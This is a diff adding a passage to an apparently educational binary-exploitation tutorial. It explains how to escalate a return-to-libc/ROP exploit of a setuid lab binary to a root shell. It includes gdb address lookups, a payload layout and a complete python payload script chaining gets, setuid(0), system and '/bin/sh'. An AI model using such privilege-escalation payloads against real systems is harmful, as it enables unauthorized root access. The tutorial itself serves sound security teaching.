@@ -490,3 +490,91 @@ gracefull exit:
 
 $ exit
 ```
+
+### Getting r00t
+
+Although we got some shells already, so the next step would be getting a
+r00t shell. If the binary we are attacking has the `setuid` bit set
+(you can check it with `ls -l`), this means we can execute it as its
+owner. If we owner is root, guess what? we can execute the program as root,
+with all the privileges.
+
+To change the `setuid` bit in the `rip` file and give its ownership to
+root:
+
+```
+sudo chown root rip
+sudo chmod u+s rip
+```
+
+If you run our exploit now, you may get a shell as root (you can check it
+by runnning `whoami`), but that is not always the case, since `system`
+is basically calling `/bin/sh -c <our argument>` and in some systems
+"/bin/sh" is just a symbolic link to "/bin/bash", which usually drop
+privileges.
+
+A workaround for this issue is to call `setuid`. This function changes
+what `uid` the user running the program has. The `root` user uid is
+`0`. So we will have to call `gets` four more times to write a entire
+`int` (4 bytes) to be used as argument.
+
+Find `setuid` address in gdb with (remember, you need to use a
+breakpoint):
+
+```
+(gdb) p setuid
+$1 = {<text variable, no debug info>} 0xf7eadd60 <setuid>
+```
+
+Since we will change where the address of `exit` is in our
+payload, the address given to the first `gets` will also change.
+In the end our payload will look like so:
+
+```
+b'A'*-x18 + b'BBBB' + gets + pop ebp; ret + address from exit to nullify + 4 * (gets + pop ebp;ret + address to nullify) + setuid + pop ebp; ret + 4 0x00 bytes + system + exit + address of "/bin/sh"
+```
+
+Right after `exit` is where we will point our `gets`. Right now
+our payload is really big, so ypu should start using a python3
+script to run it, if you haven't already.
+
+Mine ended looking like this:
+
+```
+import sys
+import struct
+import os
+
+pop_ret =  struct.pack("I", 0x080485fb)
+gets = struct.pack("I", 0xf7e5afc0)
+
+payload = b'A' * 0x18
+payload += b'BBBB'
+payload += gets
+payload += pop_ret
+payload += struct.pack("I", 0xffffd288) # address from exit to nullify
+
+for i in range(4):
+    payload += gets
+    payload += pop_ret
+    payload += struct.pack("I", 0xffffd280 + i) # address of byte to nullify
+
+payload += struct.pack("I", 0xf7eadd60) # setuid
+payload += pop_ret
+payload += b'CCCC' # will be nullified afterwards
+payload += struct.pack("I", 0xf7e36850) # system
+payload += struct.pack("I", 0xf7e2a8BB) # exit, with 'BB' instead of null byte
+payload += struct.pack("I", 0xf7f597c8) # address to /bin/sh
+
+sys.stdout.buffer.write(payload)
+```
+
+If `setuid` doesn't work, you may have to execute another program (that
+you code yourself) that gives you a shell, as root.
+
+You can call a command like `execlp` from libc to execute a simple
+python3 script like this:
+
+```
+__import__('os').system('/bin/sh -c')
+```
